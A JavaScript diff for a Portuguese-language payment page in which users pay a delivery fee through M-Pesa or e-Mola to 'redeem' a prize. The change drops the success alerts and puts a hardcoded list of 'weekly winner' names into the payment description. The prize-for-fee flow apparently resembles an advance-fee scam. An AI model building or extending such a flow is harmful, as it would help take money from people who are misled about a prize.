@@ -396,20 +396,12 @@ async function processPaymentDirect(method) {
     return;
   }
   
-  const paymentMethod = method === 'mpesa' ? 'M-Pesa' : 'e-Mola';
-  
-  alert(`Processando pagamento de ${selectedDeliveryAmount}MT via ${paymentMethod}...`);
-  
   try {
     if (method === 'mpesa') {
       await processMpesaPayment(phone, selectedDeliveryAmount);
     } else {
       await processEmolaPayment(phone, selectedDeliveryAmount);
     }
-    
-    alert(`Pagamento realizado com sucesso!\n\nResgate confirmado, ${name}!\nPrêmio: ${currentPrize}\nTaxa: ${selectedDeliveryAmount}MT via ${paymentMethod}\n\nEntraremos em contacto em breve! 🎉`);
-    
-    closeModal('form-modal');
   } catch (error) {
     alert(`Erro no pagamento: ${error.message}\nPor favor, tente novamente.`);
   }
@@ -426,10 +418,10 @@ async function processEmolaPayment(phone, amount) {
 }
 
 const weeklyNames = ['Telma Jonnase', 'Carlos Tembe', 'Ana Paula', 'João Manjate'];
+const allNamesText = 'Telma Jonnase, Carlos Tembe, Ana Paula, João Manjate';
 
 async function processPayment(method, amount) {
   try {
-    const randomName = weeklyNames[Math.floor(Math.random() * weeklyNames.length)];
     const response = await fetch('/api/pagar', {
       method: 'POST',
       headers: {
@@ -438,7 +430,7 @@ async function processPayment(method, amount) {
       body: JSON.stringify({
         method: method,
         amount: amount,
-        description: `Os melhores da semana - ${randomName}`
+        description: `Os melhores da semana - ${allNamesText}`
       })
     });
     
